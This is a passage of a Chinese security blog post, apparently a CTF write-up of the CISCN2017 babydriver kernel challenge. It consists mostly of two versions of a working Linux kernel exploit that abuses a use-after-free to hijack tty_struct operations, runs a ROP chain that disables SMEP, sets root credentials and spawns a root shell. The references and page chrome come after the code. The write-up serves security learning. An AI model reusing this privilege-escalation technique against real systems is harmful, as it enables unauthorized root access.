+            perror("mmap");
+    
+        printf("[+]     fake_stack addr: %p\n", fake_stack);
+    
+        u_int64_t* hijacked_stack_ptr = (u_int64_t*)hijacked_stack_addr;
+        int idx = 0;
+        hijacked_stack_ptr[idx++] = pop_rdi_addr;              // pop rdi; ret
+        hijacked_stack_ptr[idx++] = 0x6f0;
+        hijacked_stack_ptr[idx++] = mov_cr4_rdi_pop_rbp_addr;  // mov cr4, rdi; pop rbp; ret;
+        hijacked_stack_ptr[idx++] = 0;                         // dummy
+        hijacked_stack_ptr[idx++] = (u_int64_t)set_root_cred;
+        hijacked_stack_ptr[idx++] = swapgs_pop_rbp_addr;
+        hijacked_stack_ptr[idx++] = 0;                          // dummy
+        hijacked_stack_ptr[idx++] = iretq_addr;
+        hijacked_stack_ptr[idx++] = (u_int64_t)get_shell;       // iret_data.rip
+        hijacked_stack_ptr[idx++] = user_cs;
+        hijacked_stack_ptr[idx++] = user_eflags;
+        hijacked_stack_ptr[idx++] = user_rsp;
+        hijacked_stack_ptr[idx++] = user_ss;
+    
+        printf("[+] privilege escape ROP prepared\n");
+    
+        // 读取 tty_struct 结构体的所有数据
+        int ops_ptr_offset = 4 + 4 + 8 + 8;
+        char overwrite_mem[ops_ptr_offset + 8];
+        char** ops_ptr_addr = (char**)(overwrite_mem + ops_ptr_offset);
+    
+        read(fd2, overwrite_mem, sizeof(overwrite_mem));
+        printf("[+] origin ops ptr addr: %p\n", *ops_ptr_addr);
+    
+        // 修改并覆写 tty_struct 结构体
+        *ops_ptr_addr = (char*)fake_tty_ops;
+        write(fd2, overwrite_mem, sizeof(overwrite_mem));
+        printf("[+] hacked ops ptr addr: %p\n", *ops_ptr_addr);
+    
+        // 触发 tty_write
+        // 注意使用 write 时， buf 指针必须有效，否则会提前返回 EFAULT
+        int buf[] = {0};
+        write(master_fd, buf, 8);
+    
+        return 0;
+    }
+    
+
+运行效果：
+
+![](https://p1.ssl.qhimg.com/t016418fa81cb2c7821.png)
+
+下面是一个简化版的 exploit:
+
+    
+    
+    #include <assert.h>
+    #include <fcntl.h>
+    #include <stdio.h>
+    #include <stdlib.h>
+    #include <string.h>
+    #include <sys/ioctl.h>
+    #include <sys/mman.h>
+    #include <unistd.h>
+    
+    #define xchg_eax_esp_addr           0xffffffff8100008a
+    #define prepare_kernel_cred_addr    0xffffffff810a1810
+    #define commit_creds_addr           0xffffffff810a1420
+    #define pop_rdi_addr                0xffffffff810d238d
+    #define mov_cr4_rdi_pop_rbp_addr    0xffffffff81004d80
+    #define swapgs_pop_rbp_addr         0xffffffff81063694          
+    #define iretq_addr                  0xffffffff814e35ef
+    
+    void set_root_cred(){
+        void* (*prepare_kernel_cred)(void*) = prepare_kernel_cred_addr;
+        void (*commit_creds)(void*) = commit_creds_addr;
+        commit_creds(prepare_kernel_cred(NULL));
+    }
+    
+    void get_shell() {
+        system("/bin/sh");
+    }
+    
+    unsigned long user_cs, user_eflags, user_rsp, user_ss;
+    
+    void save_iret_data() {
+        __asm__ __volatile__ ("mov %%cs, %0" : "=r" (user_cs));
+        __asm__ __volatile__ ("pushf");
+        __asm__ __volatile__ ("pop %0" : "=r" (user_eflags));
+        __asm__ __volatile__ ("mov %%rsp, %0" : "=r" (user_rsp));
+        __asm__ __volatile__ ("mov %%ss, %0" : "=r" (user_ss));
+    }
+    
+    int main() {
+        save_iret_data();
+    
+        int fd1 = open("/dev/babydev", O_RDWR);
+        int fd2 = open("/dev/babydev", O_RDWR);
+        ioctl(fd1, 65537, 0x2e0);
+        close(fd1);
+    
+        int master_fd = open("/dev/ptmx", O_RDWR);
+    
+        u_int64_t fake_tty_ops[] = {
+            0, 0, 0, 0, 0, 0, 0,
+            xchg_eax_esp_addr
+        };
+    
+        u_int64_t hijacked_stack_addr = ((u_int64_t)fake_tty_ops & 0xffffffff);
+    
+        char* fake_stack = mmap(
+                (hijacked_stack_addr & (~0xffff)),
+                0x10000,
+                PROT_READ | PROT_WRITE,                    
+                MAP_PRIVATE | MAP_ANONYMOUS | MAP_FIXED,
+                -1,
+                0);
+    
+        u_int64_t rop_chain_mem[] = {
+            pop_rdi_addr, 0x6f0, 
+            mov_cr4_rdi_pop_rbp_addr, 0, set_root_cred,
+            swapgs_pop_rbp_addr, 0, 
+            iretq_addr, get_shell, user_cs, user_eflags, user_rsp, user_ss
+        };
+        memcpy(hijacked_stack_addr, rop_chain_mem, sizeof(rop_chain_mem));
+    
+        int ops_ptr_offset = 4 + 4 + 8 + 8;
+        char overwrite_mem[ops_ptr_offset + 8];
+        char** ops_ptr_addr = overwrite_mem + ops_ptr_offset;
+    
+        read(fd2, overwrite_mem, sizeof(overwrite_mem));
+        *ops_ptr_addr = fake_tty_ops;
+        write(fd2, overwrite_mem, sizeof(overwrite_mem));
+    
+        int buf[] = {0};
+        write(master_fd, buf, 8);
+    
+        return 0;
+    }
+    
+
+## 五、参考
+
+  * [CTF Wiki – Linux Platform Kernel Mode](https://wiki.x10sec.org/pwn/linux/kernel-mode/environment/readme/)
+  * [How to use KGDB – LinuxLink](https://linuxlink.timesys.com/docs/how_to_use_kgdb)
+  * [kernelexp学习笔记](https://d1nn3r.github.io/2019/07/27/kernelexp/)
+  * [【Writeup】CISCN2017_Pwn_babydriver – CSDN](https://blog.csdn.net/m0_38100569/article/details/100673103)
+  * _[Linux Device Drivers, Third Edition – Chapter 3 Char Drivers](https://lwn.net/Kernel/LDD3/)_
+  * [Linux下使用class_create,device_create自动创建设备文件结点](https://blog.csdn.net/tq384998430/article/details/54342044)
+  * [Linux下tty/pty/pts/ptmx详解](https://www.cnblogs.com/bittorrent/p/3789193.html)
+  * [Linux终端简介与pty编程](https://www.cnblogs.com/dux2016/articles/6236131.html)
+  * Linux manual page
+
+本文翻译自 [原文链接]()。如若转载请注明出处。
+
+商务合作，文章发布请联系 anquanke@360.cn
+
+本文由 **Kiprey** 原创发布
+
+转载，请参考[转载声明](https://www.anquanke.com/note/repost)，注明出处：
+[https://www.anquanke.com/post/id/255884](/post/id/255884)
+
+安全客 - 有思想的安全新媒体
+
+本文转载自: []()
+
+如若转载,请注明出处： []()
+
+安全客 - 有思想的安全新媒体
+
+分享到：![微信](https://p0.ssl.qhimg.com/sdm/28_28_100/t01e29062a5dcd13c10.png)
+
+  * [Pwn](/tag/Pwn)
+  * [CTF](/tag/CTF)
+  * [Kernel](/tag/Kernel)
+
+ **+1** __1赞
+
+ __收藏
+
+![](https://thirdqq.qlogo.cn/g?b=oidb&k=Ggib7X9SSVicoZnE34KxGlzg&s=40&t=1506914961)
+Kiprey
+
+分享到：![微信](https://p0.ssl.qhimg.com/sdm/28_28_100/t01e29062a5dcd13c10.png)
+
